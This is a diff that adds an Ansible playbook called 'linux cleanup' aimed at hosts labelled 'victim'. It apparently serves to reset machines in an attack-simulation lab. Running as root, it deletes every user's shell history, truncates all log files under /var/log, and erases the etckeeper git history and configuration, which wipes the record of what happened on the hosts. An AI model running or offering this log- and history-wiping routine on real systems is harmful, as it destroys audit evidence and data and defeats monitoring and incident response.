@@ -1,0 +1,112 @@
+---
+- name: linux cleanup
+  hosts: linux:&victim
+  gather_facts: yes
+
+  tasks:
+    # System-wide cleanup tasks (run as root)
+    - name: Find all user home directories
+      ansible.builtin.find:
+        paths: /home
+        file_type: directory
+        recurse: no
+      register: user_homes
+      become: yes
+
+    - name: Clean shell history files for all users
+      ansible.builtin.file:
+        path: "{{ item[0].path }}/{{ item[1] }}"
+        state: absent
+      loop: "{{ user_homes.files | product(history_files) | list }}"
+      vars:
+        history_files:
+          - .bash_history
+          - .zsh_history
+          - .history
+          - .sh_history
+      become: yes
+      ignore_errors: yes
+
+    - name: Clean root user history files
+      ansible.builtin.file:
+        path: "/root/{{ item }}"
+        state: absent
+      with_items:
+        - .bash_history
+        - .zsh_history
+        - .history
+        - .sh_history
+      become: yes
+      ignore_errors: yes
+
+    - name: Clear current session history for bash
+      ansible.builtin.shell: |
+        if command -v bash >/dev/null 2>&1; then
+          history -c
+        fi
+      ignore_errors: yes
+
+    - name: Clear current session history for zsh
+      ansible.builtin.shell: |
+        if command -v zsh >/dev/null 2>&1; then
+          history -p
+        fi
+      ignore_errors: yes
+
+    - name: Clean temporary directories
+      ansible.builtin.file:
+        path: "{{ item }}"
+        state: absent
+        force: yes
+      with_items:
+        - /opt/filegen
+        - /tmp/ansible-*
+        - /var/tmp/ansible-*
+      become: yes
+      ignore_errors: yes
+
+    - name: Clear system logs
+      ansible.builtin.shell: |
+        find /var/log -type f -name "*.log" -exec truncate -s 0 {} \;
+        find /var/log -type f -name "*.log.*" -exec truncate -s 0 {} \;
+      become: yes
+      ignore_errors: yes
+
+    # Etckeeper cleanup
+    - name: Check if etckeeper is installed
+      ansible.builtin.stat:
+        path: /etc/.git
+      register: etckeeper_git
+      become: yes
+      ignore_errors: yes
+
+    - name: Clean etckeeper git history
+      ansible.builtin.shell: |
+        cd /etc
+        git config --global user.email "cleanup@example.com"
+        git config --global user.name "Cleanup Script"
+        git add -A
+        git commit -m "Final cleanup commit" || true
+        git gc --aggressive --prune=now
+        git reflog expire --expire=now --all
+      when: etckeeper_git.stat.exists | default(false)
+      become: yes
+      ignore_errors: yes
+
+    - name: Remove etckeeper git repository
+      ansible.builtin.file:
+        path: "/etc/.git"
+        state: absent
+        force: yes
+      become: yes
+      ignore_errors: yes
+
+    - name: Remove etckeeper configuration
+      ansible.builtin.file:
+        path: "{{ item }}"
+        state: absent
+      with_items:
+        - /etc/etckeeper
+        - /etc/.etckeeper
+      become: yes
+      ignore_errors: yes
